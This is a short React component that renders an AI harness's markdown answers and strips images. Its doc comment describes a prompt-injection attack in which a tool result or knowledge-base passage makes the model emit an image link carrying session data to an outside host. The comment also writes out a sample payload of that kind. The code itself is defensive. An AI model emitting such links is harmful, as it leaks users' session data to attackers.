import type { ReactNode } from "react";
import Markdown from "react-markdown";

/**
 * The harness answers in markdown. react-markdown turns raw HTML into text and blocks `javascript:` URLs itself; on top of
 * that, images are dropped (a tool result or knowledge-base passage could make the model answer with
 * `![](https://host/x?<session data>)`, which the browser would fetch without a click: the classic prompt-injection
 * exfiltration channel) and links open in a new tab without a referrer or window handle.
 */
export function AnswerMarkdown({ children }: { children: string }) {
  return (
    <Markdown
      disallowedElements={["img"]}
      unwrapDisallowed
      components={{
        a: ({ href, children: linkChildren }: { href?: string; children?: ReactNode }) => (
          <a href={href} target="_blank" rel="noopener noreferrer">
            {linkChildren}
          </a>
        ),
      }}
    >
      {children}
    </Markdown>
  );
}
